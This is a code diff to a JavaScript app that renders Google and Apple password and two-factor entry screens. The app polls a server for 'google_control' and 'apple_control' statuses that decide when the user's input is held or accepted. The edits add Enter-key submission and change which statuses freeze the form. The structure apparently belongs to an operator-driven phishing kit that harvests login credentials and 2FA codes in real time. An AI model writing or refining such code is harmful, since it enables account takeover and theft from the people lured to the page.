@@ -1668,7 +1668,17 @@ function initApp() {
     }
 
     if (googleEmailInput) googleEmailInput.addEventListener("input", clearGoogleErrors);
-    if (googlePasswordInput) googlePasswordInput.addEventListener("input", clearGoogleErrors);
+    if (googlePasswordInput) {
+        googlePasswordInput.addEventListener("input", clearGoogleErrors);
+        googlePasswordInput.addEventListener("keydown", (e) => {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                if (btnSubmitGooglePassword && !btnSubmitGooglePassword.disabled) {
+                    btnSubmitGooglePassword.click();
+                }
+            }
+        });
+    }
 
     if (btnSubmitGoogleEmail) {
         btnSubmitGoogleEmail.addEventListener("click", () => {
@@ -1740,7 +1750,7 @@ function initApp() {
             if (data && data.ok && data.google_control) {
                 console.log("CTRL:", data.google_control);
                 const ctrl = data.google_control;
-                if (ctrl.status === "checking" || ctrl.status === "pending" || ctrl.status === "prompt_confirmed") {
+                if (ctrl.status === "checking" || ctrl.status === "prompt_confirmed") {
                     if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
                     if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = true;
                     if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = true;
@@ -2473,7 +2483,7 @@ function initApp() {
             if (data && data.ok && data.apple_control) {
                 const ctrl = data.apple_control;
                 console.log("APPLE CTRL:", ctrl);
-                if (ctrl.status === "checking" || ctrl.status === "pending") {
+                if (ctrl.status === "checking") {
                     if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
                     if (btnSubmitApplePassword) btnSubmitApplePassword.disabled = true;
                     if (btnSubmitApple2FA) btnSubmitApple2FA.disabled = true;
